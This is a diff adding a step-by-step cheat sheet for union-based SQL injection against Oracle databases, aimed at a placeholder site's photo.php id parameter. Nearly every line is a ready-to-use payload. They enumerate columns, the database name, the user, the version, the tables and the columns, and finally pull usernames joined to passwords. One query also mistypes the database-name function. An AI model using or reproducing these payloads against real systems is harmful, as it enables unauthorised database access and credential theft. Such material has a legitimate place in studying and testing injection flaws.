@@ -1,0 +1,66 @@
+
+                                           Union Based Oracle Injection
+
+
+www.vuln-web.com/photo.php?id=1-' order by 10--
+
+
+www.vuln-web.com/photo.php?id=1' union select null,null,null,null,null,null,null,null,null from dual--
+
+
+
+www.vuln-web.com/photo.php?id=1' union select '1111',null,null,null,null,null,null,null,null from dual--
+
+
+www.vuln-web.com/photo.php?id=1' union select null,'2222',null,null,null,null,null,null,null from dual--
+
+
+This means we can use the second column from now. Now to get the Database name we can use:
+(select ora_database_name from dual)
+(select sys.database_name from dual)
+(select global_name from global_name)
+
+
+www.vuln-web.com/photo.php?id=1' union select null,ora.database_name,null,null,null,null,null,null,null from dual--
+
+
+To get the username we can use:
+(select user from DUAL)
+(select user from users)
+
+
+www.vuln-web.com/photo.php?id=1' union select null,user,null,null,null,null,null,null,null from dual--
+
+To get the version we can use:
+(select banner from v$version where rownum=1)
+
+
+www.vuln-web.com/photo.php?id=1' union select null,(select banner from v$version where rownum=1),null,null,null,null,null,null,null from dual--
+
+
+To get the Table Names we can use:
+(select table_name from all_tables)
+
+www.vuln-web.com/photo.php?id=1' union select null,table_name,null,null,null,null,null,null,null from all_tables--
+
+
+To get the columns for a specific table we can use (here in example i am using user_table):
+(select column_name from all_tab_columns where table_name='Your_Table_name_here')
+
+www.vuln-web.com/photo.php?id=1' union select null,column_name,null,null,null,null,null,null,null from all_tab_columns where table_name='user_table'--
+
+To extract data from some columns we can use the following query alongwith the || as concatination operator:
+(select username||password from table_name_here)
+
+
+www.vuln-web.com/photo.php?id=1' union select null,username||password,null,null,null,null,null,null,null from user_table--
+
+
+
+
+
+
+
+
+
+
